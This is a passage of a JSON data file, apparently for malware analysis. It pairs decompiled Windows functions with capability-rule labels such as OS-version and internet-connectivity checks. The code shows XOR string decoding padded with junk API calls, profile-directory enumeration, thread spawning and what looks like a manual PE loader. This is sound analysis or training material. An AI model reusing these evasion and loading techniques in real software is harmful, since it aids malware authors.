(*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar4 != 0xf06e8c) {\n            *(iVar8 + iVar2) = *(&var_34h + iVar8 % var_54h) ^ (iVar8 + iVar2)[var_2ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_28h = 0xc21283f;\n    var_24h = 0x2b262019;\n    var_20h = 0x26211a07;\n    var_1ch._0_1_ = 0x3e;\n    var_1ch._1_1_ = 7;\n    var_1ch._2_2_ = 0x201b;\n    var_18h._0_1_ = 0x20;\n    var_18h._1_1_ = 0x2c;\n    var_18h._2_2_ = 0x6907;\n    var_bh = var_bh & 0xffffff | 0x52000000;\n    var_7h = 0x69624849;\n    uVar3 = (*pcVar6)(8, 0x15);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_34h = &var_28h - iVar2;\n    var_2ch = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar4 != 0xed4af2) {\n            *(iVar8 + iVar2) = *(&var_bh + iVar8 % var_54h + 3) ^ (iVar8 + iVar2)[var_34h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x14);\n    var_28h = 0x330d0831;\n    var_24h = 0x2f035a;\n    var_20h = 0x502310;\n    var_1ch._0_1_ = 0x33;\n    var_1ch._1_1_ = 6;\n    var_1ch._2_2_ = 0x2311;\n    var_18h._0_1_ = 0x77;\n    var_18h._1_1_ = 0xf;\n    var_18h._2_2_ = 0xc10;\n    var_14h = 99;\n    var_bh = var_bh & 0xffffff | 0x63000000;\n    var_7h = 0x35576369;\n    var_3h._0_1_ = 0x6e;\n    uVar3 = (*pcVar6)(8, 0x16);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_34h = &var_28h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar4 != 0xea0b24) {\n            *(iVar8 + iVar2) = *(&var_bh + iVar8 % var_44h + 3) ^ (iVar8 + iVar2)[&var_28h - iVar2];\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x15);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_5ch, var_40h);\n    (*pcVar6)(var_58h, &var_110h);\n    (*pcVar6)(var_2ch, 0x412434);\n    (*pcVar6)(iVar2, &var_150h);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    puVar9 = puVar5;\n    for (iVar8 = 0xc; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar5 = 0x20;\n    *0x41cb34 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n    pcVar6 = _sym.imp.KERNEL32.dll_CreateThread;\n    *0x41cac0 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040eb13, puVar5, 0, 0);\n    *0x41cac4 = (*pcVar6)(0, 0, fcn.0040cc8b, *0x41cb38, 0, 0);\n    *0x41cac8 = (*pcVar6)(0, 0, fcn.0040ad08, puVar5, 0, 0);\n    *0x41cacc = (*pcVar6)(0, 0, 0x4076da, puVar5, 0, 0);\n    uVar3 = (*pcVar6)(0, 0, fcn.0040591c, arg_8h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar1)(0, var_2ch);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_58h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_40h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_50h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_3ch);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_5ch);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_48h);\n    (*pcVar6)(uVar3);\n    return 0;\n}\n",
        "token_count": 5631
    },
    "0040484c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040484c(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code **ppcVar8;\n    code *pcVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar11 = 0;\n    ppcVar8 = arg_8h[0xc];\n    if (ppcVar8 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar9 = *arg_8h;\n        arg_8h = ppcVar8;\n        (*pcVar9)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar8[0xf] + ppcVar8;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar8;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar8;\n            iVar6 = var_ch[3];\n            if (iVar6 != 0) {\n                do {\n                    iVar7 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar8 = ppcVar1 + 0x210;\n                        do {\n                            iVar7 = iVar7 + 1;\n                            *ppcVar8 = cVar3;\n                            ppcVar8 = ppcVar8 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar7];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar7 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar7 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar7 < 0) {\n                        iVar7 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_18h = iVar6 + arg_8h;\n                        for (var_8h = iVar5 + arg_8h; ppcVar8 = *var_8h,  ppcVar8 != NULL; var_8h = var_8h + 1) {\n                            if (ppcVar8 < 0x80000000) {\n                                ppcVar8 = ppcVar8 + arg_8h;\n                            }\n                            else if ((ppcVar8 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar8)) {\n                                var_4h = *var_8h;\n                                ppcVar8 = NULL;\n                            }\n                            if (ppcVar8 != NULL) {\n                                pcVar9 = ppcVar8 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar9;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar9[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar9;\n                                ppcVar8 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar7 = (*ppcVar1[2])(var_14h, ppcVar8, var_4h, &var_20h);\n                            if (iVar7 < 0) {\n                                iVar7 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar7 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar9 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar10 = pcVar9 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 = *puVar10;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        iVar6 = 4;\n                    }\n                    else {\n                        iVar6 = (uVar2 >> 0x1f & 2U) + 2;\n                    }\n                }\n                else {\n                    iVar6 = (uVar2 >> 0x1f & 0x20U) + 0x20;\n                }\n                var_ch = puVar10[-7];\n                var_24h = puVar10[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, iVar6, &var_28h);\n                puVar10 = puVar10 + 10;\n                uVar11 = uVar11 + 1;\n                pcVar9 = var_10h;\n            } while (uVar11 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar9 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1550
    },
    "00404e07": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404e07(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_80h;\n    int32_t var_7ch;\n    int32_t var_78h;\n    uint lpcchSize;\n    int32_t var_70h;\n    uint ARG_0;\n    uint8_t *var_68h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint lpFileName;\n    int32_t lpMem;\n    uint var_44h;\n    uint lpProfileDir;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint8_t var_14h [2];\n    uint var_12h;\n    uint var_dh;\n    uint var_9h;\n    uchar var_5h;\n    uchar var_4h;\n    uchar var_3h;\n    uchar uStack6;\n    uint var_1h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    lpFileName = (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    ARG_0 = (*pcVar5)(uVar2);\n    var_50h = 5;\n    var_12h._0_1_ = 5;\n    lpcchSize = 0x104;\n    var_28h = 0x7a04771b;\n    var_24h = 0x6b165708;\n    var_20h = 0x77776b16;\n    var_1ch = 0x570e7a38;\n    var_18h = 0x6b0e6b03;\n    var_14h[0] = 0x3e;\n    var_14h[1] = 0x77;\n    var_12h._1_1_ = 0x7a;\n    var_12h._2_1_ = 0xc;\n    stack0xffffffed = 0x457;\n    var_dh._0_1_ = 0x6b;\n    var_dh._1_1_ = 0x26;\n    var_dh._2_2_ = 0x36b;\n    var_9h._0_1_ = 0x77;\n    var_9h._1_1_ = 0xe;\n    var_9h._2_1_ = 0x7a;\n    var_78h = 6;\n    var_9h._3_1_ = 6;\n    var_5h = 0x57;\n    var_4h = 7;\n    var_3h = 0x6b;\n    uStack6 = 0x7a;\n    var_1h._0_1_ = 0x6b;\n    lpMem = 0x7a6b7757;\n    var_44h._0_1_ = 0x6b;\n    uVar2 = (*pcVar1)(8, 0x51);\n    iVar3 = (*pcVar5)(uVar2);\n    iVar6 = 0;\n    var_70h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar4 != 0x1ab11) {\n            *(iVar6 + iVar3) = *(&lpMem + iVar6 % var_50h) ^ (iVar6 + iVar3)[&var_28h - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x28);\n    var_28h = 0x6606450f;\n    var_9h._3_1_ = 5;\n    var_24h = 0x76014e05;\n    var_20h = 0x453a7507;\n    var_1ch = 0x4e296617;\n    var_18h = 0x75097609;\n    var_14h[0] = 0x2d;\n    var_14h[1] = 0x45;\n    var_12h._0_1_ = 0x17;\n    var_12h._1_1_ = 0x66;\n    var_12h._2_1_ = 0x19;\n    stack0xffffffed = 0x194e;\n    var_dh._0_1_ = 0x76;\n    var_dh._1_1_ = 0x32;\n    var_dh._2_2_ = 0x2b75;\n    var_9h._0_1_ = 0x45;\n    var_9h._1_1_ = 0x1b;\n    var_9h._2_1_ = 0x66;\n    var_5h = 0x4e;\n    var_4h = 0x45;\n    var_3h = 0x76;\n    var_3ch = 0x6676454e;\n    var_38h._0_1_ = 0x75;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    var_80h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    lpMem = var_80h;\n    var_34h = &var_28h - var_80h;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        uVar2 = lpProfileDir;\n        if (iVar6 != 0xfcf843) {\n            *(iVar3 + var_80h) = *(&var_3ch + iVar3 % var_50h) ^ (iVar3 + var_80h)[&var_28h - var_80h];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x26);\n    var_7ch = var_70h;\n    iVar3 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, L\"%s\\\\*\", uVar2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        var_34h = iVar3;\n        while (iVar3 != -1) {\n            iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x4103b0);\n            if ((iVar6 != 0) && (iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x4103b4),  iVar6 != 0)) {\n                var_64h = 0;\n                var_58h = 0x4348381a;\n                var_54h._0_2_ = 0x3075;\n                var_60h = 0x43623846;\n                var_5ch._0_2_ = 0x3075;\n                var_30h = 0x4b32634d;\n                var_2ch._0_1_ = 0x42;\n                do {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpFileName, uVar2);\n                    uVar2 = (*pcVar5)(8, 0xd);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_68h = &var_58h - iVar3;\n                    var_3ch = iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                        if (iVar4 != 0xb69f20) {\n                            *(iVar6 + iVar3) = *(&var_60h + iVar6 % var_78h) ^ (iVar6 + iVar3)[&var_58h - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 6);\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(lpFileName, iVar3);\n                    var_14h[0] = 0x68;\n                    var_14h[1] = 99;\n                    var_12h._0_1_ = 0x41;\n                    var_12h._1_1_ = 0x4b;\n                    var_12h._2_1_ = 0x1e;\n                    stack0xffffffed = 0x464d;\n                    var_dh._0_1_ = 0x32;\n                    var_dh._1_1_ = 0x38;\n                    var_dh._2_2_ = 0x1142;\n                    var_9h._0_1_ = 99;\n                    var_9h._1_1_ = 0x17;\n                    var_9h._2_1_ = 0x4b;\n                    var_9h._3_1_ = 0x31;\n                    var_5h = 0x4d;\n                    var_4h = 99;\n                    var_3h = 0x32;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_68h = var_14h + -iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n                        if (iVar4 != 0x58999c) {\n                            *(iVar6 + iVar3) = *(&var_30h + iVar6 % var_50h) ^ (iVar6 + iVar3)[var_14h + -iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0x12);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar3, lpProfileDir, &psz1, (&var_80h)[var_64h]);\n                    fcn.0040faed(1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    uVar2 = (*pcVar5)(0, var_3ch);\n                    (*pcVar1)(uVar2);\n                    var_64h = var_64h + 1;\n                    uVar2 = lpProfileDir;\n                    iVar3 = var_34h;\n                } while (var_64h < 2);\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar3, &lpFindFileData);\n            if (iVar6 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n                iVar3 = -1;\n                var_34h = -1;\n            }\n        }\n    }\n    var_24h = 0x311b504d;\n    var_20h = 0x4823680a;\n    var_1ch = 0x500d7345;\n    var_18h = 0x68213125;\n    var_14h[0] = 0x3f;\n    var_14h[1] = 0x48;\n    var_12h._0_1_ = 0x5e;\n    var_12h._1_1_ = 0x73;\n    var_12h._2_1_ = 0x1c;\n    stack0xffffffed = 0x6d50;\n    var_dh._0_1_ = 0x31;\n    var_dh._1_1_ = 0x2f;\n    var_dh._2_2_ = 0x468;\n    var_9h._0_1_ = 0x48;\n    var_9h._1_1_ = 0x54;\n    var_9h._2_1_ = 0x73;\n    var_9h._3_1_ = 5;\n    var_5h = 0x50;\n    var_4h = 0x38;\n    var_3h = 0x31;\n    uStack6 = 0x73;\n    var_1h._0_1_ = 0x68;\n    var_30h = 0x31485068;\n    var_2ch._0_1_ = 0x73;\n    uVar2 = (*pcVar5)(8, 0x49);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_3ch = &var_24h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar4 != 0x5ea1db) {\n            *(iVar6 + iVar3) = *(&var_30h + iVar6 % var_50h) ^ (iVar6 + iVar3)[&var_24h - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x24);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar3, lpProfileDir, 0x104);\n    fcn.0040faed(1);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, ARG_0);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, lpProfileDir);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, lpMem);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, var_70h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return;\n}\n",
        "token_count": 3486
    },
    "004052df": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004052df(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    code *pcVar14;\n    int16_t *piVar15;\n    uint lpFindFileData;\n    uint lpString1;\n    uint *lpMem;\n    int32_t var_d0h;\n    int32_t var_cch;\n    int32_t var_c8h;\n    uint var_c4h;\n    int32_t lpString2;\n    int32_t var_bch;\n    int32_t var_b8h;\n    ushort var_b4h;\n    uint var_b2h;\n    uint var_abh;\n    uint var_a7h;\n    uint var_a3h;\n    uint var_9fh;\n    uint var_9bh;\n    uint var_97h;\n    uint var_93h;\n    uchar var_8fh;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t hFindFile;\n    uchar *ARG_0;\n    int16_t *var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uchar var_50h;\n    uint var_4fh;\n    uchar var_4bh;\n    uchar *lpFileName;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar var_24h;\n    uchar var_23h;\n    uint var_22h;\n    uint var_1dh;\n    uint var_19h;\n    ushort var_15h;\n    ushort var_13h;\n    uint32_t var_11h;\n    int32_t dwBytes;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.USERENV.dll_GetProfilesDirectoryW;\n    var_c4h = 0;\n    ARG_0 = NULL;\n    dwBytes = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &dwBytes);\n    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (dwBytes != 0) {\n        dwBytes = dwBytes + 10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes * 2);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_5ch = piVar4;\n        uVar3 = (*pcVar14)(8, dwBytes * 2);\n        lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(8, 0x208);\n            puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            puVar6 = &lpFindFileData;\n            ARG_0 = puVar5;\n            for (iVar10 = 0x250; piVar4 = var_5ch,  iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = lpFileName;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            piVar15 = var_5ch;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *piVar15 = 0;\n                piVar15 = piVar15 + 1;\n            }\n            iVar10 = (*pcVar2)(var_5ch, &dwBytes);\n            if (iVar10 != 0) {\n                iVar10 = lpFileName - piVar4;\n                do {\n                    iVar1 = *piVar4;\n                    *(piVar4 + iVar10) = iVar1;\n                    piVar4 = piVar4 + 1;\n                } while (iVar1 != 0);\n                var_bch = 6;\n                var_54h = 0x371d3506;\n                _var_50h = 0x35706d67;\n                var_4fh._3_1_ = 0x37;\n                var_4bh = 0x37;\n                var_8h = 0x3737355a;\n                var_4h._0_2_ = 0x6d49;\n                uVar3 = (*pcVar14)(8, 0x15);\n                puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar10 = 0;\n                lpMem = puVar6;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_GetInputState)();\n                    if (iVar7 != 0xf8383e) {\n                        *(iVar10 + puVar6) = *(&var_8h + iVar10 % var_bch) ^ (iVar10 + puVar6)[&var_54h - puVar6];\n                    }\n                    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    iVar10 = iVar10 + 1;\n                    puVar12 = puVar6;\n                } while (iVar10 < 10);\n                do {\n                    iVar1 = *puVar12;\n                    puVar12 = puVar12 + 2;\n                } while (iVar1 != 0);\n                uVar13 = puVar12 - puVar6;\n                puVar12 = lpFileName + -2;\n                do {\n                    piVar4 = puVar12 + 2;\n                    puVar12 = puVar12 + 2;\n                } while (*piVar4 != 0);\n                for (uVar11 = uVar13 >> 2; uVar11 != 0; uVar11 = uVar11 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                for (uVar13 = uVar13 & 3; uVar13 != 0; uVar13 = uVar13 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_58h = 0x47307542;\n                    var_7ch = 0x4730756c;\n                    var_78h._0_2_ = 0x4d4e;\n                    var_84h = 0x45765941;\n                    var_80h._0_2_ = 0x6f43;\n                    var_6ch = 0x4558596f;\n                    var_68h._0_1_ = 0x43;\n                    var_b8h = 5;\n                    do {\n                        iVar7 = 0;\n                        uVar3 = (*pcVar14)(8, 9);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        lpString2 = iVar10;\n                        var_44h = &var_58h - iVar10;\n                        do {\n                            iVar8 = (*_sym.imp.USER32.dll_GetCursor)();\n                            if (iVar8 != 0x2e8109) {\n                                *(iVar7 + iVar10) = *(&var_7ch + iVar7 % var_bch) ^ (iVar7 + iVar10)[&var_58h - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 4);\n                        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar7 = 0;\n                        var_d0h = iVar10;\n                        var_44h = &var_84h - iVar10;\n                        do {\n                            iVar9 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n                            iVar8 = lpString2;\n                            if (iVar9 != 0xf22e6c) {\n                                *(iVar7 + iVar10) = *(&var_6ch + iVar7 % var_b8h) ^ (iVar7 + iVar10)[&var_84h - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 6);\n                        iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, lpString2);\n                        pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (((iVar7 != 0) &&\n                            (iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar10),  iVar7 != 0)) &&\n                           ((lpFindFileData & 0x10) != 0)) {\n                            var_22h._0_1_ = 5;\n                            var_38h = 0x7a04771b;\n                            var_34h = 0x6b165708;\n                            var_30h = 0x77776b16;\n                            var_2ch = 0x570e7a38;\n                            var_28h = 0x6b0e6b03;\n                            var_24h = 0x3e;\n                            var_23h = 0x77;\n                            var_22h._1_2_ = 0xc7a;\n                            stack0xffffffdd = 0x457;\n                            var_1dh._0_2_ = 0x266b;\n                            var_1dh._2_2_ = 0x36b;\n                            var_19h._0_2_ = 0xe77;\n                            var_19h._2_1_ = 0x7a;\n                            var_19h._3_1_ = 6;\n                            var_15h = 0x757;\n                            var_13h = 0x7a6b;\n                            var_11h._0_1_ = 0x6b;\n                            var_74h = 0x7a6b7757;\n                            var_70h._0_1_ = 0x6b;\n                            uVar3 = (*pcVar14)(8, 0x51);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_44h = iVar10;\n                            unique0x1000063b = &var_38h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                                if (iVar8 != 0x1ab11) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_74h + iVar7 % var_b8h) ^ (iVar7 + iVar10)[&var_38h - iVar10];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x28);\n                            var_b2h._0_1_ = 6;\n                            var_b4h = 0x450f;\n                            var_b2h._1_1_ = 0x66;\n                            var_b2h._2_1_ = 5;\n                            stack0xffffff4d = 0x776014e;\n                            var_abh = 0x17453a75;\n                            var_a7h = 0x94e2966;\n                            var_a3h = 0x2d750976;\n                            var_9fh = 0x19661745;\n                            var_9bh = 0x3276194e;\n                            var_97h = 